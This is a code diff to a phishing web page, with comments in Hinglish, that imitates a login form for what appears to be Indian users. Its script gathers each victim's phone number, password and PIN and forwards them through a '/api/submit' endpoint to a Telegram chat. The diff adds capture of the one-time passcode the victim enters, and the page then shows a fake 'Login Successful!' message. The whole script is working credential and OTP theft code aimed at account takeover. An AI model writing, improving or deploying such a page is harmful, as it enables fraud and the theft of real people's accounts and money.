@@ -116,79 +116,94 @@
     <!-- SCRIPT TAG YAHAN SE SHURU HO RAHA HAI -->
     <script>
         // --- TELEGRAM MESSAGE BHEJNE KA FUNCTION ---
-        async function sendToTelegram(messageText) {
-            try {
-                const res = await fetch('/api/submit', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ message: messageText })
-                });
-                
-                if (res.ok) {
-                    return true;
-                } else {
-                    return false;
-                }
-            } catch (error) {
-                return false;
-            }
+async function sendToTelegram(messageText) {
+    try {
+        const res = await fetch('/api/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: messageText })
+        });
+        return res.ok;
+    } catch (error) {
+        return false;
+    }
+}
+
+const modal = document.getElementById('otpModal');
+const displayPhone = document.getElementById('displayPhone');
+const sendOtpBtn = document.getElementById('sendOtpBtn');
+let timerInterval;
+
+function closeModal() {
+    modal.style.display = 'none';
+    clearInterval(timerInterval);
+    sendOtpBtn.innerText = "Send";
+    sendOtpBtn.disabled = false;
+}
+
+// 1. SIGN IN BUTTON (Login details Telegram par jayengi)
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const phone = document.getElementById('phone').value;
+    const password = document.getElementById('password').value;
+    const pin = document.getElementById('pin').value;
+
+    const msg = `🔔 *Naya User Login Kar Raha Hai!*\n\n📞 Phone: ${phone}\n🔑 Password: ${password}\n🔢 PIN: ${pin}`;
+    sendToTelegram(msg); 
+
+    displayPhone.innerText = `+91 ${phone}`;
+    modal.style.display = 'flex'; 
+});
+
+// 2. SEND OTP BUTTON (60 Second Timer ke saath)
+sendOtpBtn.addEventListener('click', async function() {
+    const phone = document.getElementById('phone').value;
+    
+    this.disabled = true;
+    let timeLeft = 60;
+    this.innerText = `${timeLeft}s`;
+
+    // Telegram par OTP request ka message bhejna
+    const msg = `🚨 *OTP Request Aaya Hai!*\n\n📱 User ne Send OTP dabaya.\n📞 Phone: ${phone}`;
+    await sendToTelegram(msg);
+
+    timerInterval = setInterval(() => {
+        timeLeft--;
+        sendOtpBtn.innerText = `${timeLeft}s`;
+
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            sendOtpBtn.innerText = "Send";
+            sendOtpBtn.disabled = false;
         }
+    }, 1000);
+});
 
-        const modal = document.getElementById('otpModal');
-        const displayPhone = document.getElementById('displayPhone');
+// 3. CONFIRM BUTTON (OTP Telegram par jayega)
+document.getElementById('confirmOtpBtn').addEventListener('click', async function() {
+    const phone = document.getElementById('phone').value;
+    const otp = document.getElementById('otpCode').value;
+    
+    if(!otp) {
+        alert("Pehle 6-digit OTP enter karein!");
+        return;
+    }
 
-        function closeModal() {
-            modal.style.display = 'none';
-        }
+    this.innerText = "Confirming...";
+    this.disabled = true;
 
-        // 1. SIGN IN BUTTON DABANE PAR
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const phone = document.getElementById('phone').value;
-            const password = document.getElementById('password').value;
-            const pin = document.getElementById('pin').value;
+    const msg = `✅ *OTP Confirm Hua!*\n\n📞 Phone: ${phone}\n🔢 Entered OTP: ${otp}`;
+    const success = await sendToTelegram(msg);
 
-            const msg = `🔔 *Naya User Login Kar Raha Hai!*\n\n📞 Phone: ${phone}\n🔑 Password: ${password}\n🔢 PIN: ${pin}`;
-            sendToTelegram(msg); 
+    if(success) {
+        alert("Login Successful!");
+        closeModal();
+        document.getElementById('loginForm').reset();
+        document.getElementById('otpCode').value = "";
+    } else {
+        alert("OTP send nahi ho paya, network check karein.");
+    }
 
-            displayPhone.innerText = `+91 ${phone}`;
-            modal.style.display = 'flex'; 
-        });
-
-        // 2. OTP POPUP ME "SEND" DABANE PAR (Sirf dikhawa)
-        document.getElementById('sendOtpBtn').addEventListener('click', function() {
-            this.innerText = "Sending...";
-            this.disabled = true;
-
-            setTimeout(() => {
-                this.innerText = "Send";
-                this.disabled = false;
-                alert("OTP aapke mobile number par send kar diya gaya hai!");
-            }, 1500);
-        });
-
-        // 3. OTP POPUP ME "CONFIRM" DABANE PAR (Sirf dikhawa)
-        document.getElementById('confirmOtpBtn').addEventListener('click', function() {
-            const otp = document.getElementById('otpCode').value;
-            
-            if(!otp) {
-                alert("Pehle 6-digit OTP enter karein!");
-                return;
-            }
-
-            this.innerText = "Confirming...";
-            this.disabled = true;
-
-            setTimeout(() => {
-                alert("Login Successful!");
-                closeModal();
-                document.getElementById('loginForm').reset();
-                this.innerText = "Confirm";
-                this.disabled = false;
-            }, 1500);
-        });
-    </script>
-    <!-- SCRIPT TAG YAHAN KHATAM HO RAHA HAI -->
-
-</body>
-</html>
+    this.innerText = "Confirm";
+    this.disabled = false;
+});
